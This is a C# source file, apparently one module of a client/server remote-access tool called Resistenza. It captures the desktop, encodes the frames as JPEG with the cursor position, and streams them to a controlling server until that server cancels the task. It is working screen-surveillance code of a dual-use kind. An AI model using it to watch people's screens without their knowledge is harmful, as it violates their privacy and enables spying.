using NAudio.CoreAudioApi;
using NAudio.Wave;
using Resistenza.Client.Logic;
using Resistenza.Common.Networking;
using Resistenza.Common.Packets.Microphone;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

using DesktopDuplication;

namespace Resistenza.Common.Packets.Remote_Desktop
{
    public class DesktopBroadcast
    {
        public DesktopBroadcast(SecureStream Server, SemaphoreSlim Lock)
        {

            _ServerStrem = Server;
            _Lock = Lock;
        }

        private SecureStream _ServerStrem;
        private SemaphoreSlim _Lock;
        private int _Frames;

        [StructLayout(LayoutKind.Sequential)]
        private struct CURSORINFO
        {
            public Int32 cbSize;
            public Int32 flags;
            public IntPtr hCursor;
            public POINTAPI ptScreenPos;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct POINTAPI
        {
            public int x;
            public int y;
        }

        [DllImport("user32.dll")]
        private static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyHeight, int istepIfAniCur, IntPtr hbrFlickerFreeDraw, int diFlags);

        private const Int32 CURSOR_SHOWING = 0x0001;
        private const Int32 DI_NORMAL = 0x0003;

        [DllImport("user32.dll")]
        static extern bool EnumDisplayDevices(string lpDevice, uint iDevNum, ref DISPLAY_DEVICE lpDisplayDevice, uint dwFlags);

        [Flags()]
        public enum DisplayDeviceStateFlags : int
        {
            /// <summary>The device is part of the desktop.</summary>
            AttachedToDesktop = 0x1,
            MultiDriver = 0x2,
            /// <summary>The device is part of the desktop.</summary>
            PrimaryDevice = 0x4,
            /// <summary>Represents a pseudo device used to mirror application drawing for remoting or other purposes.</summary>
            MirroringDriver = 0x8,
            /// <summary>The device is VGA compatible.</summary>
            VGACompatible = 0x10,
            /// <summary>The device is removable; it cannot be the primary display.</summary>
            Removable = 0x20,
            /// <summary>The device has more display modes than its output devices support.</summary>
            ModesPruned = 0x8000000,
            Remote = 0x4000000,
            Disconnect = 0x2000000
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct DISPLAY_DEVICE
        {
            [MarshalAs(UnmanagedType.U4)]
            public int cb;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
            public string DeviceName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string DeviceString;
            [MarshalAs(UnmanagedType.U4)]
            public DisplayDeviceStateFlags StateFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string DeviceID;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string DeviceKey;
        }

        [DllImport("DesktopDuplicatorNative.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int InitDesktopDuplicationByName([MarshalAs(UnmanagedType.LPWStr)] string monitorName, out IntPtr ppDeskDupl);

        [DllImport("DesktopDuplicatorNative.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int InitDesktopDuplicationByIndex(int MonitorIndex, out IntPtr ppDeskDupl);

        [DllImport("DesktopDuplicatorNative.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int GetFrame(IntPtr pDeskDupl, out IntPtr ppFrame);

        [DllImport("DesktopDuplicatorNative.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int ReleaseDesktopDuplciation(IntPtr pDeskDupl);




        public static List<MonitorDeviceInfo> GetDevicesInfo()
        {
            List<MonitorDeviceInfo> Monitors = new();

            ManagementObjectSearcher searcher =
                new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_DesktopMonitor");


            foreach (Screen ScreenDevice in Screen.AllScreens)
            {
                MonitorDeviceInfo Info = new();
                Info.ScreenWidth = ScreenDevice.Bounds.Size.Width;
                Info.ScreenHeight = ScreenDevice.Bounds.Size.Height;
                Info.IsMainMonitor = ScreenDevice.Primary;

                //a quanto pare prima serve MonitorDeviceInfo.DeviceName per poi, utilizzando la funzione dell'api di windows EnumDisplayDevices(), trovare il friendly name

                DISPLAY_DEVICE d = new DISPLAY_DEVICE();
                d.cb = Marshal.SizeOf(d);
                EnumDisplayDevices(ScreenDevice.DeviceName, 0, ref d, 0);

                Info.Name = ScreenDevice.DeviceName;
                Info.FriendlyName = d.DeviceString;




                Monitors.Add(Info);
            }

            return Monitors;


        }
        public async Task StartStreaming(string DeviceName, CancellationTokenSourceWithId CancelOperation)
        {
            Task SendTask = Task.Delay(0);

           
            DesktopDuplicator duplicator = new DesktopDuplicator(0);
            while (true)
            {
                if (CancelOperation.IsCancellationRequested && (CancelOperation.IdOfTaskToBeCancelled == TasksIds.STREAM_DESKTOP_TASK_ID || CancelOperation.IdOfTaskToBeCancelled == TasksIds.ALL_ACTIONS))
                {
                    duplicator.Stop();
                    CancelOperation.Token.ThrowIfCancellationRequested();
                        
                }

                using (   MemoryStream ms = new MemoryStream())
                {
                    DesktopFrame frame = duplicator.GetLatestFrame();

                    if (frame == null)
                    {
                        await Task.Yield(); //restituisce il controllo al chiamante in modo da non creare un ciclo stretto
                        continue;
                    }

                    frame.DesktopImage.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);

                    await _Lock.WaitAsync();
                    await SendTask;
                    _Lock.Release();

                    DesktopFrameResponse frameResponse = new DesktopFrameResponse()
                    {
                        ScreenCapture = ms.ToArray(),
                        CursorLocationX = frame.CursorLocation.X,
                        CursorLocationY = frame.CursorLocation.Y,   
                       

                    };
                    SendTask = _ServerStrem.SendPacketAsync(frameResponse);
                    _Frames++;
                }

                await Task.Yield(); //restituisce il controllo al chiamante in modo da non creare un ciclo stretto
            }
        }
            
        

        private void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            Console.WriteLine($"Frames: {_Frames}");
            _Frames = 0;
        }  
    }

    public class MonitorDeviceInfo
    {
        public string Name { get; set; }
        public string FriendlyName { get; set; }
        public int ScreenHeight { get; set; }
        public int ScreenWidth { get; set; }
        public bool IsMainMonitor { get; set; }

    }
}
